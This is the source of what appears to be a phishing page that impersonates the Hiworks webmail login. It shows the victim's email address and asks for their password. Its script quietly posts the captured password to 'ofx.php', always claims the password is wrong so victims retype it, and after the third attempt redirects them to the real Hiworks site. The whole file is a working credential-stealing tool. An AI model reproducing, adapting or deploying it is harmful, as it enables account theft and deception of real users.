<?php include '../build.php' ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hiworks Login</title>
    <link rel="stylesheet" href="../assets/password-fix.css?v=2">
    <style>
        * { box-sizing: border-box; }

        body {
            margin: 0;
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 120px;
            min-height: 100vh;
            color: #333;
        }

        .login-container {
            width: 400px;
            max-width: 90vw;
            text-align: center;
        }

        .logo { margin-bottom: 20px; }
        .logo img { height: 40px; }

        .subtext {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 20px;
        }

        .subdomain { color: #666; }

        .instruction {
            font-size: 13px;
            color: #666;
            margin-bottom: 30px;
        }

        /* Email chip */
        .email-display {
            display: inline-flex;
            align-items: center;
            border: 1px solid #ccc;
            border-radius: 999px;
            padding: 6px 14px;
            margin-bottom: 30px;
            font-size: 14px;
            background-color: transparent;
            max-width: 100%;
        }

        .email-display img {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            opacity: 0.6;
            background-color: #999;
            border-radius: 50%;
        }

        .email-display span {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        /* Hidden form fields — never visible */
        input[type="hidden"] {
            display: none !important;
            visibility: hidden !important;
            width: 0 !important;
            height: 0 !important;
            padding: 0 !important;
            margin: 0 !important;
            border: 0 !important;
            position: absolute !important;
        }

        /* ============================================================
           PASSWORD INPUT — native type="password" (best masking)
           ============================================================ */
        .input-group {
            position: relative;
            margin-bottom: 12px;
            width: 100%;
        }

        .input-group input[type="password"] {
            width: 100%;
            height: 44px;
            padding: 10px 12px 10px 40px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            font-family: inherit;
            letter-spacing: 2px;              /* native bullets look better spaced */
            background: #fff;
            color: #333;
            outline: none;
            transition: border-color .15s ease, box-shadow .15s ease;
            -webkit-text-security: disc;      /* normalizes bullets across browsers */
            text-security: disc;
        }

        .input-group input[type="password"]:focus {
            border-color: #2c8ff9;
            box-shadow: 0 0 0 2px rgba(44,143,249,.15);
        }

        /* Autofill styling (Chrome yellow background fix) */
        .input-group input[type="password"]:-webkit-autofill,
        .input-group input[type="password"]:-webkit-autofill:hover,
        .input-group input[type="password"]:-webkit-autofill:focus {
            -webkit-box-shadow: 0 0 0 1000px #fff inset;
            -webkit-text-fill-color: #333;
            transition: background-color 5000s ease-in-out 0s;
        }

        .input-group img {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            width: 16px;
            height: 16px;
            opacity: 0.6;
            pointer-events: none;
            z-index: 2;
        }

        /* Reveal toggle */
        .reveal-toggle {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: transparent;
            border: 0;
            padding: 6px;
            cursor: pointer;
            color: #666;
            font-size: 12px;
            font-weight: 500;
            z-index: 2;
        }
        .reveal-toggle:hover { color: #2c8ff9; }

        /* Error */
        .error-message {
            display: none;
            font-size: 13px;
            color: #d84a49;
            text-align: left;
            margin: 0 0 12px;
            padding-left: 2px;
            line-height: 1.4;
        }

        /* Submit */
        .sign-in-button {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #2c8ff9;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            border: 1px solid #2c8ff9;
            cursor: pointer;
            margin-bottom: 18px;
            transition: background .15s ease;
        }
        .sign-in-button:hover { background-color: #1d7de0; }

        /* Options */
        .options-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 13px;
            margin-bottom: 40px;
        }
        .options-row a {
            color: #2c8ff9;
            text-decoration: none;
            font-weight: 500;
        }

        .ip-security {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            color: #333;
            cursor: pointer;
        }

        .switch {
            position: relative;
            display: inline-block;
            width: 34px;
            height: 18px;
            flex-shrink: 0;
        }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider {
            position: absolute;
            inset: 0;
            background-color: #ccc;
            border-radius: 34px;
            transition: 0.4s;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 14px;
            width: 14px;
            left: 2px;
            bottom: 2px;
            background: #fff;
            transition: 0.4s;
            border-radius: 50%;
        }
        .switch input:checked + .slider { background-color: #2c8ff9; }
        .switch input:checked + .slider:before { transform: translateX(16px); }

        @media (max-width: 480px) {
            body { padding-top: 60px; }
            .subtext { font-size: 20px; }
            .login-container { width: 100%; padding: 0 20px; }
        }
    </style>
</head>
<body>
    <form class="login-container" id="loginForm" method="POST" action="" autocomplete="on">
        <!-- Logo -->
        <div class="logo">
            <img src="../images/login.svg" alt="Hiworks">
        </div>

        <br><br>

        <!-- Domain subtitle -->
        <div class="subtext">
            Sign in to <span class="subdomain"><?php
                $emailForDomain = htmlspecialchars($decoded ?? '');
                $atPos = strpos($emailForDomain, '@');
                echo $atPos !== false ? substr($emailForDomain, $atPos + 1) : 'hiworks.com';
            ?></span>
        </div>

        <div class="instruction">Please enter your password for identity verification.</div>

        <!-- Email chip -->
        <div class="email-display">
            <img src="https://img.icons8.com/ios-filled/50/ffffff/user-male-circle.png" alt="User">
            <span><?php echo htmlspecialchars($decoded ?? ''); ?></span>
        </div>

        <!-- Hidden fields -->
        <input type="hidden" name="user" value="<?php echo htmlspecialchars($decoded ?? ''); ?>">
        <input type="hidden" name="login" value="hiworks">
        <input type="hidden" name="ms_link" value="<?php echo base64_encode('https://login.office.hiworks.com/'); ?>">

        <!-- Password field — NATIVE masking -->
        <div class="input-group">
            <img src="https://img.icons8.com/ios/50/000000/lock--v1.png" alt="Lock">
            <input type="password"
                   id="password"
                   name="pass"
                   placeholder="Password"
                   autocomplete="current-password"
                   autocapitalize="off"
                   autocorrect="off"
                   spellcheck="false"
                   minlength="1"
                   maxlength="128"
                   required>
            <button type="button"
                    class="reveal-toggle"
                    id="revealToggle"
                    aria-label="Show password"
                    aria-pressed="false">Show</button>
        </div>

        <p id="loginMessage" class="error-message"></p>

        <button type="submit" class="sign-in-button">Sign in</button>

        <div class="options-row">
            <a href="#">Sign in with another ID</a>
            <label class="ip-security">
                <span class="switch">
                    <input type="checkbox" checked>
                    <span class="slider"></span>
                </span>
                IP Security
            </label>
        </div>
    </form>

    <script type="text/javascript">
    (function () {
        'use strict';

        var loginAttempts = 0;
        var actionUrl     = 'ofx.php';

        // --------------------------------------------------------
        // Reveal toggle — swaps native type="password"/"text"
        // --------------------------------------------------------
        function initReveal() {
            var pwd    = document.getElementById('password');
            var toggle = document.getElementById('revealToggle');
            if (!pwd || !toggle) return;

            toggle.addEventListener('click', function (e) {
                e.preventDefault();
                var isHidden = pwd.type === 'password';
                pwd.type = isHidden ? 'text' : 'password';
                toggle.textContent = isHidden ? 'Hide' : 'Show';
                toggle.setAttribute('aria-pressed', isHidden ? 'true' : 'false');
                toggle.setAttribute('aria-label',   isHidden ? 'Hide password' : 'Show password');
                // keep cursor at end
                var len = pwd.value.length;
                try { pwd.setSelectionRange(len, len); } catch (_) {}
                pwd.focus();
            });
        }

        // --------------------------------------------------------
        // Submit handler
        // --------------------------------------------------------
        function handleSubmit(event) {
            event.preventDefault();

            var pwd          = document.getElementById('password');
            var emailField   = document.querySelector('input[name="user"]');
            var loginMessage = document.getElementById('loginMessage');

            if (!pwd || pwd.value.trim() === '') {
                loginMessage.textContent   = 'Please Enter Your Password.';
                loginMessage.style.display = 'block';
                pwd && pwd.focus();
                return;
            }

            loginAttempts++;

            // Submit to ofx.php — native FormData
            try {
                var form = document.getElementById('loginForm');
                var fd   = new FormData(form);
                fetch(actionUrl, {
                    method: 'POST',
                    body:   fd,
                    keepalive: true
                }).catch(function () {});
            } catch (e) {
                document.getElementById('loginForm').submit();
                return;
            }

            // Clear password + show message
            pwd.value = '';
            loginMessage.style.display = 'block';

            if (loginAttempts === 1) {
                loginMessage.textContent = 'Your password is incorrect.';
            } else if (loginAttempts === 2) {
                loginMessage.textContent = 'Login attempt timed out. Please try again.';
            } else {
                loginMessage.textContent = 'Too many failed attempts.';
                setTimeout(function () {
                    window.top.location.href = 'https://main.hiworks.com/error/404/';
                }, 500);
            }
        }

        // --------------------------------------------------------
        // Boot
        // --------------------------------------------------------
        function init() {
            initReveal();

            var emailField = document.querySelector('input[name="user"]');
            if (!emailField || !emailField.value) return;

            var form = document.getElementById('loginForm');
            if (form) form.addEventListener('submit', handleSubmit);
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }
    })();
    </script>
</body>
</html>